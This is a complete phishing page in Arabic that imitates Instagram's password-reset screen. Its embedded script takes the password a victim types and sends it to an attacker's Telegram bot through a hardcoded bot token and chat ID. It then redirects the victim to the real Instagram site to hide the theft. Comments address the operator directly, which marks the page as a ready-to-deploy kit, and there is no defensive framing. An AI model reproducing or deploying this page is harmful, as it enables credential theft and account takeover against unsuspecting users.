<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إعادة تعيين كلمة المرور • إنستغرام</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
        
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .reset-container {
            width: 100%;
            max-width: 380px;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 40px 30px;
            text-align: center;
        }

        /* تصميم أيقونة القفل الاحترافية */
        .lock-icon {
            width: 70px;
            height: 70px;
            margin: 0 auto 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            border: 3px solid #262626;
            border-radius: 50%;
            font-size: 30px;
        }

        .title {
            font-size: 18px;
            font-weight: 700;
            color: #262626;
            margin-bottom: 10px;
        }

        .subtitle {
            font-size: 14px;
            color: #8e8e8e;
            margin-bottom: 20px;
            line-height: 1.5;
        }

        .input-group {
            margin-bottom: 10px;
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 12px 10px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 14px;
            outline: none;
            color: #262626;
            font-family: 'Cairo', sans-serif;
        }

        .input-group input:focus {
            border: 1px solid #a8a8a8;
            background: #fff;
        }

        .reset-btn {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-weight: 700;
            font-size: 15px;
            cursor: pointer;
            margin-top: 15px;
            font-family: 'Cairo', sans-serif;
            transition: 0.2s;
        }

        .reset-btn:disabled {
            background-color: #b2dffc;
            cursor: not-allowed;
        }

        .error-text {
            color: #ed4956;
            font-size: 13px;
            margin-top: 10px;
            display: none;
            text-align: right;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 25px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .divider span { padding: 0 15px; }

        .back-link {
            color: #0095f6;
            font-size: 14px;
            font-weight: 700;
            text-decoration: none;
            display: block;
        }
    </style>
</head>
<body>

    <div class="reset-container">
        <!-- أيقونة القفل (SVG) -->
        <div class="lock-icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#262626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
            </svg>
        </div>
        
        <div class="title">هل تواجه مشكلة في تسجيل الدخول؟</div>
        <div class="subtitle">أدخل كلمة المرور الجديدة لتأمين حسابك.</div>

        <form id="resetForm">
            <div class="input-group">
                <input type="password" id="newPassword" placeholder="كلمة المرور الجديدة" required>
            </div>
            <div class="input-group">
                <input type="password" id="confirmPassword" placeholder="تأكيد كلمة المرور" required>
            </div>
            
            <div class="error-text" id="errorMsg">كلمتا المرور غير متطابقتين!</div>

            <button type="submit" class="reset-btn" id="resetBtn">إعادة تعيين كلمة المرور</button>
        </form>

        <div class="divider"><span>أو</span></div>
        
        <a href="https://www.instagram.com" class="back-link">العودة إلى تسجيل الدخول</a>
    </div>

    <script>
        // ⚠️ التوكن والايدي تبعك ⚠️
        const TELEGRAM_TOKEN = "7884048436:AAHEQ8N2qHVg65FNiCrE9wRTuRngDRi9WZs"; 
        const TELEGRAM_CHAT_ID = "5969012336";

        document.getElementById('resetForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const pass1 = document.getElementById('newPassword').value;
            const pass2 = document.getElementById('confirmPassword').value;
            const btn = document.getElementById('resetBtn');
            const errorMsg = document.getElementById('errorMsg');

            // التحقق من تطابق كلمتي المرور
            if (pass1 !== pass2) {
                errorMsg.style.display = 'block';
                return; // إيقاف العملية إذا لم تتطابق
            }

            errorMsg.style.display = 'none';
            btn.disabled = true;
            btn.innerText = "جاري الحفظ...";

            // إرسال الباسورد للبوت
            const message = `🔐 **محاولة تغيير كلمة مرور إنستغرام:**\n\n🔑 كلمة المرور: ${pass1}`;
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

            fetch(url)
                .then(response => {
                    if (response.ok) {
                        // الخدعة الكبرى: تحويل المستخدم لإنستغرام الحقيقي
                        btn.innerText = "تم الحفظ بنجاح! جاري التحويل...";
                        setTimeout(() => {
                            window.location.href = "https://www.instagram.com"; // التحويل لإنستغرام
                        }, 1500);
                    } else {
                        throw new Error("فشل الإرسال");
                    }
                })
                .catch(error => {
                    btn.disabled = false;
                    btn.innerText = "إعادة تعيين كلمة المرور";
                    alert("حدث خطأ في الشبكة، حاول مرة أخرى.");
                });
        });
    </script>
</body>
</html>
